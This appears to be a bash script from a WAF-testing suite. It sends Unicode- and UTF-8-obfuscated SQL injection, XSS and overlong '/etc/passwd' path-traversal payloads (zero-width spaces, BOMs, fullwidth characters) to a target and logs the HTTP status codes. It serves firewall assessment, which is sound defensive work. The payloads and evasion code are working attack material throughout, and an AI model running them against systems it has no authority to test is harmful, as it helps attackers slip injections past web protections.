#!/bin/bash
# Unicode and UTF-8 evasion: zero-width chars, BOM, fullwidth, overlong sequences
# Tests whether WAF normalizes Unicode before pattern matching
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 03-unicode-utf8-evasion.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Unicode/UTF-8 Evasion against ${TARGET}"
echo ""

echo "[+] Zero-width space insertion (U+200B)"
ZWSP_PAYLOADS=(
  "un%E2%80%8Bion%20select"
  "un%E2%80%8Bi%E2%80%8Bo%E2%80%8Bn%20se%E2%80%8Blect"
  "%3Csc%E2%80%8Bript%3Ealert(1)%3C/script%3E"
  "' O%E2%80%8BR 1=1--"
)

for payload in "${ZWSP_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-55s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[+] BOM insertion (U+FEFF)"
BOM_PAYLOADS=(
  "%EF%BB%BFunion%20select"
  "%EF%BB%BF%3Cscript%3Ealert(1)%3C/script%3E"
  "%EF%BB%BF'%20OR%201=1--"
)

for payload in "${BOM_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-55s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[+] Zero-width + BOM combined (user's example pattern)"
COMBINED_PAYLOADS=(
  "un%E2%80%8Bi%EF%BB%BFon%20se%E2%80%8Blect"
  "%3Cscr%E2%80%8Bi%EF%BB%BFpt%3Ealert(1)%3C/script%3E"
  "un%E2%80%8Bi%EF%BB%BFon%20se%E2%80%8Blect%20*%20from%20users"
)

for payload in "${COMBINED_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-55s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[+] Fullwidth character substitution (U+FF1C = ＜, U+FF1E = ＞)"
FULLWIDTH_PAYLOADS=(
  "%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E"
  "%EF%BC%87%20OR%201%EF%BC%9D1--"
  "%EF%BC%9Cimg%20src%EF%BC%9Dx%20onerror%EF%BC%9Dalert(1)%EF%BC%9E"
)

for payload in "${FULLWIDTH_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-55s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[+] Overlong UTF-8 sequences"
# Overlong 2-byte / (0x2F) -> 0xC0 0xAF
# Overlong 2-byte < (0x3C) -> 0xC0 0xBC
echo "  Sending overlong path traversal..."
code=$(curl -sk -o /dev/null -w "%{http_code}" \
  --data-binary $'q=\xc0\xafetc\xc0\xafpasswd' \
  "${BASE}/" --max-time 10) || code="ERR"
printf "    overlong-2byte-traversal               -> HTTP %s\n" "${code}"

echo "  Sending overlong XSS..."
code=$(curl -sk -o /dev/null -w "%{http_code}" \
  --data-binary $'q=\xc0\xbcscript\xc0\xbealert(1)\xc0\xbc/script\xc0\xbe' \
  "${BASE}/" --max-time 10) || code="ERR"
printf "    overlong-2byte-xss                     -> HTTP %s\n" "${code}"

echo "  Sending 3-byte overlong XSS..."
code=$(curl -sk -o /dev/null -w "%{http_code}" \
  --data-binary $'q=\xe0\x80\xbcscript\xe0\x80\xbe' \
  "${BASE}/" --max-time 10) || code="ERR"
printf "    overlong-3byte-xss                     -> HTTP %s\n" "${code}"
echo ""

echo "[*] Unicode/UTF-8 evasion complete"
